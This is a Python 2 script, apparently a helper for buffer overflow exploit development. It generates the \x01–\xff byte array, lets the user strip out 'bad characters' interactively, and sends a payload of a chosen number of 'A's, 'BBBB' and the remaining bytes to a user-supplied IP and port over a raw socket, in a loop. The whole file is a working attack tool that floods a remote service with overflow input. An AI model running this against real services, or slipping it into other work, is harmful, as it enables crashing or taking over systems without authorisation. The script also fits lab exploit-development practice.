#!/usr/bin/env python 
# -*- coding: utf-8 -*-

import time
import os
import readline

class File_Create:
      def __init__(self):
          self.banner()
          self.OS_dir()                  
      def banner(self):
           self.banner = """ 
            __             ____  ______             ________
            \ \      _  __/ __ \/ __ \ \      _  __/ __/ __/
             \ \    | |/_/ / / / / / /\ \    | |/_/ /_/ /_  
              \ \  _>  </ /_/ / /_/ /  \ \  _>  </ __/ __/  
               \_\/_/|_|\____/\____/    \_\/_/|_/_/ /_/     
                                                                          
           """ 
           print self.banner    
      def OS_dir(self):
         try: 
             try:    
                 dir_1= "Badchar"
                 path = os.getcwd()   
                 create= os.path.join(path,dir_1)
                 os.mkdir(create)
                 time.sleep(2) 
                 os.chdir(dir_1)
                 print "\n[+] badchar.py create file Badchar at[*]".capitalize(),os.getcwd()       
             except OSError:
                time.sleep(2)
                os.chdir(dir_1)
                print "\n[*]File is created at Same Path[*]".capitalize(),os.getcwd()
                time.sleep(2)
         except KeyboardInterrupt:
              print self.banner
              exit()
if __name__=="__main__":
   
  import string            

class HEX_ARRAT_byte(File_Create):
           
      def __init__(self) : 
                File_Create.__init__(self)    
                self.HEX_array()
                self.HEX_FORMAT()
      def HEX_array(self): 
             try:
                 print """\n[+]The Hex Number Array from "['\\x01' to '\\xFf ]' Created [+]"""
                 print
                 time.sleep(2)
                 hex_num =''.join("\\x"+'{:02x}'.format(x)for x in range(1,256))
                 with open("./text.txt",'w')as file:
                      file_w = file.write(hex_num)
                 with open("./text.txt",'r') as file :
                       self.file_r = file.read() 
                       print self.file_r  
                       time.sleep(2)
                       print "\n[?] in order to try all hex Number '\\x01'to'\\xFF' press 'Enter[?]'"
             except KeyboardInterrupt:
                print self.banner
                exit()                                
      def HEX_FORMAT(self): 
             try:
                 for i in self.file_r :
                     time.sleep(2)
                     self.hex_input = str(raw_input("\n[%]Enter the Hex Number Badchar : "))
                     if len(self.hex_input) == 0 or len(self.hex_input)== 4:
                           pass              
                     else:
                         print "\n[!]bad input order[!]"
                         time.sleep(2)
                         return self.HEX_FORMAT() 
                         time.sleep(2)
                     if self.hex_input in self.file_r:
                        remove = self.file_r.replace(self.hex_input,'')                           
                        with open("./text.txt",'w')as file:
                             file_w = file.write(remove)
                        with open("./text.txt",'r') as file :
                              self.file_r = file.read()
                              time.sleep(2)
                              print "\n[W]Bad_Character generate the Hex byte ready to send [W]:"
                              time.sleep(2)
                              print                   
                              print self.file_r 
                              hex_num_array = self.file_r.replace("\\x",'')
                              hex_num_bytes =hex_num_array.decode("hex")
                              with open("./bytearray.bin",'wb')as file :
                                  self.file_byte = file.write(hex_num_bytes)
                              with open("./bytearray.bin",'rb') as file:
                                   self.file_byte =file.read()  
                                   break   
                     else:
                          time.sleep(2) 
                          print "\n[?]the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed[?]" 
                          time.sleep(2)    
                          print"\n[#]Enter the Number in hexadecimal value "
                          return self.HEX_FORMAT()
                                                  
             except KeyboardInterrupt:
                print self.banner
                exit()    
                               
if __name__=='__main__':
     
    import socket
      
class SOCKET_SOCKET(HEX_ARRAT_byte):
                 
       def __init__(self):
               HEX_ARRAT_byte.__init__(self)
               self._info()
               self._SOCKET_SOCKET()     
       def _info (self):
              try:
                 try:
                    time.sleep(2)
                    self.ipaddr = str(raw_input("\n[@] Enter ip addres :"))
                    time.sleep(2)
                    self.port = int(raw_input("\n[%] Enter port Connection :"))
                    time.sleep(2)
                    Buffer = int(raw_input("\n[&]Enter The Number of Bytes Buffer Overflow  :"))
                    Buffer_1 = Buffer * "A"
                    Buffer_2 = "BBBB"
                    self.payload = Buffer_1 + Buffer_2
                 except Exception:
                    
                     print "\n(@)SomeThing is wrong try again[]"
                     return self._info()
              except KeyboardInterrupt:
                  print self.banner
                  exit()                 
       def _SOCKET_SOCKET(self):
              try:
                 try:
                    _socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    _socket.connect((self.ipaddr,self.port))
                    time.sleep(2)
                    print "\n[*]Connect IP ",self.ipaddr ,"at port",self.port," Connections are Established[*]\n".upper()
                    _socket.send(self.payload+self.file_byte+'\n\r')      
                    time.sleep(2)
                 except Exception:
                     print "\n(@)SomeThing is Wrong try again the  connect Not Established[]"
                     time.sleep(2)
                     print "\n[*] Pleaes Check the Port and ip Address or maybe the Host is down  [*]"
                     _socket.close()
                     return self._info()     
                 _socket.recv(1023)
                 _socket.close()
                 print"!!![+]Data Is Send [+]!!!"
              except KeyboardInterrupt:
                 print self.banner
                 exit()        
                                        
if __name__=="__main__":
   pass

class Main(SOCKET_SOCKET):
      
        def __init__(self):
          SOCKET_SOCKET.__init__(self)
          list=[]
          while True:   
            try: 
              list.append(self.hex_input)
              print  
              print"[#]Bad Character Removed is \\x00,",','.join(list)
              time.sleep(2)
              print"\n if you want to quit please press CTRI+C"
              time.sleep(2)
              self.HEX_FORMAT()
              self._SOCKET_SOCKET()
            except KeyboardInterrupt:
                  print self.banner
                  exit()     
if __name__=="__main__":               
   Main()         
